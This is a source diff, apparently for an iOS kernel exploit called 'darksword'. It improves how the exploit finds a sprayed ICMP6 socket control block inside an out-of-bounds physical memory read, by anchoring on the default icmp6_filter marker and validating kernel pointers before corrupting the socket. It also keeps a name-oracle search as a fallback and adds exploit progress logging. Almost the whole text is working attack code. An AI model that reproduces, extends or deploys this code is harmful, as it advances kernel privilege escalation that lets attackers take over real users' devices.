@@ -125,6 +125,7 @@ static int highestSuccessIdx = 0;
 static int successReadCount = 0;
 static uint64_t gNameHits = 0, gRejZero = 0, gRejGencnt = 0, gRejCsi = 0;
 static uint64_t gInpcbMarkers = 0;
+static uint64_t gMarkerHits = 0;
 static struct iovec iov;
 static char executablePath[PATH_MAX];
 static const char *executableName;
@@ -531,34 +532,70 @@ void kwrite_buf(uint64_t where, void *buf, size_t size) {
 int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
                              void *rBuf, void *wBuf, NSMutableArray *usedGc, bool doRead) {
     if (doRead) phys_oob_read_retry(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rBuf);
-    // Reference (darksword-kexploit) matching: find the executableName oracle in
-    // the OOB window, align down to the 0x400-aligned inpcb base (kalloc.1024),
-    // and confirm a real inpcb via a nonzero field at icmp6filt+8.
-    int si = 0; bool found = false; uint64_t pso = 0;
-    void *hit;
-    do {
-        hit = memmem(rBuf + si, OOB_SIZE - si, executableName, strlen(executableName));
-        if (hit) {
-            gNameHits++;
-            pso = (uint64_t)hit - (uint64_t)rBuf & 0xFFFFFFFFFFFFFC00ULL;
-            uint64_t f8 = *(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT + 8);
-            if ((gNameHits & 0xF) == 1) {
-                printf("[dbg] hit pso=0x%llx icmp6filt8=0x%llx tg(+0x78)=0x%llx next(+0x28)=0x%llx\n",
-                    pso, f8,
-                    *(uint64_t*)((uintptr_t)rBuf + pso + 0x78),
-                    *(uint64_t*)((uintptr_t)rBuf + pso + 0x28));
-                fflush(stdout);
+    // PRIMARY search: ClearSword marker-anchored. Every freshly created ICMP6
+    // inpcb carries the default icmp6_filter marker 0x0000ffffffffffff
+    // (bytes ff..ff 00) at pcb + OFFSET_ICMP6FILT + 8, so the inpcb base is
+    // pso = marker_offset - (OFFSET_ICMP6FILT + 8). Unlike the name oracle this
+    // does not depend on the executableName string physically landing in the
+    // window (on-device the name matches our own socket_info, not inpcbs).
+    // Validate cheaply with the inp_gencnt range before doing the linear match.
+    const uint64_t filtMarker = 0x0000ffffffffffffULL;
+    uint64_t pso = 0; bool found = false;
+    NSNumber *gFirst = [(NSMutableArray*)socketPcbIds firstObject];
+    NSNumber *gLast  = [(NSMutableArray*)socketPcbIds lastObject];
+    uint64_t gmin = gFirst ? [gFirst unsignedLongLongValue] : 0;
+    uint64_t gmax = gLast  ? [gLast unsignedLongLongValue] : 0;
+    for (int si = 0; si + (OFFSET_ICMP6FILT + 8) <= OOB_SIZE; si += 8) {
+        if (*(uint64_t*)((uintptr_t)rBuf + si) != filtMarker) continue;
+        uint64_t mpso = (uint64_t)si - (OFFSET_ICMP6FILT + 8);
+        uint64_t mtg = *(uint64_t*)((uintptr_t)rBuf + mpso + 0x78);
+        uint64_t mNext = *(uint64_t*)((uintptr_t)rBuf + mpso + 0x28);
+        uint64_t mSock = *(uint64_t*)((uintptr_t)rBuf + mpso + 0x40);
+        // quick shape check: gencnt inside our spray range + kernel heap
+        // list/socket pointers (arm64e pointers sit at 0xffffffd..)
+        if (!(mtg >= gmin && mtg <= gmax && (mtg & 1) == 0)) continue;
+        if ((mNext >> 40) != 0xFFFFFF && (mSock >> 40) != 0xFFFFFF) continue;
+        pso = mpso;
+        found = true;
+        gMarkerHits++;
+        printf("[+] marker-anchored inpcb! pso=0x%llx tg=0x%llx next=0x%llx sock=0x%llx\n",
+            (unsigned long long)pso, (unsigned long long)mtg,
+            (unsigned long long)mNext, (unsigned long long)mSock);
+        fflush(stdout);
+        describe_window(rBuf, OOB_SIZE, "mkf");
+        dump_window(rBuf, OOB_SIZE, "mkf");
+        break;
+    }
+    if (!found) {
+        // FALLBACK: reference (darksword-kexploit) name-oracle matching. Find
+        // the executableName anywhere in the window, align down to the 0x400
+        // inpcb base, and confirm a real inpcb via a nonzero field at
+        // icmp6filt+8. Only useful when the name co-locates with an inpcb.
+        int si = 0; void *hit;
+        do {
+            hit = memmem(rBuf + si, OOB_SIZE - si, executableName, strlen(executableName));
+            if (hit) {
+                gNameHits++;
+                pso = (uint64_t)hit - (uint64_t)rBuf & 0xFFFFFFFFFFFFFC00ULL;
+                uint64_t f8 = *(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT + 8);
+                if ((gNameHits & 0xF) == 1) {
+                    printf("[dbg] hit pso=0x%llx icmp6filt8=0x%llx tg(+0x78)=0x%llx next(+0x28)=0x%llx\n",
+                        pso, f8,
+                        *(uint64_t*)((uintptr_t)rBuf + pso + 0x78),
+                        *(uint64_t*)((uintptr_t)rBuf + pso + 0x28));
+                    fflush(stdout);
+                }
+                if (f8) {
+                    found = true;
+                    describe_window(rBuf, OOB_SIZE, "cand");
+                    dump_window(rBuf, OOB_SIZE, "cand");
+                    break;
+                }
+                gRejZero++;
             }
-            if (f8) {
-                found = true;
-                describe_window(rBuf, OOB_SIZE, "cand");
-                dump_window(rBuf, OOB_SIZE, "cand");
-                break;
-            }
-            gRejZero++;
-        }
-        si += 0x400;
-    } while (hit == NULL && si < OOB_SIZE);
+            si += 0x400;
+        } while (hit == NULL && si < OOB_SIZE);
+    }
     if (!found) return -1;
 
     uint64_t tg = *(uint64_t*)((uintptr_t)rBuf + pso + 0x78);
@@ -1588,6 +1625,8 @@ bool run_darksword(void) {
                         gInpcbMarkers++;
                         printf("[+] inpcb-marker window! map=%llu off=0x%llx markers=%llu (cum=%llu)\n",
                             s, (unsigned long long)so, m, (unsigned long long)gInpcbMarkers);
+                        if (gInpcbMarkers <= 16)
+                            dump_window(rBuf, OOB_SIZE, "mk");
                     }
                     if ((successReadCount <= 8) && (gDumpCount < 64)) {
                         describe_window(rBuf, OOB_SIZE, "first-ok");
@@ -1608,8 +1647,8 @@ bool run_darksword(void) {
                 }
             }
             double mEl = (double)(mach_absolute_time() - mStart) * (double)timebase.numer / (double)timebase.denom / 1000000000.0;
-            printf("[exploit]   map %llu done: readOK=%d try=%d nameHits=%llu rej0=%llu rejGc=%llu rejCsi=%llu inpcbMrk=%llu %.1fs\n",
-                s, successReadCount, highestSuccessIdx, gNameHits, gRejZero, gRejGencnt, gRejCsi, gInpcbMarkers, mEl);
+            printf("[exploit]   map %llu done: readOK=%d try=%d nameHits=%llu rej0=%llu rejGc=%llu rejCsi=%llu inpcbMrk=%llu mkHit=%llu %.1fs\n",
+                s, successReadCount, highestSuccessIdx, gNameHits, gRejZero, gRejGencnt, gRejCsi, gInpcbMarkers, gMarkerHits, mEl);
             fflush(stdout);
             mach_port_deallocate(mach_task_self(), memObj);
             if (ok) break;
@@ -1646,6 +1685,7 @@ bool run_darksword(void) {
     printf("[+] highestSuccessIdx: %d\n", highestSuccessIdx);
     printf("[+] successReadCount: %d\n", successReadCount);
     printf("[+] inpcbMarkerWindows: %llu\n", (unsigned long long)gInpcbMarkers);
+    printf("[+] markerAnchoredInpcbs: %llu\n", (unsigned long long)gMarkerHits);
     fflush(stdout);
 
     goSync = 0; raceSync = 1;
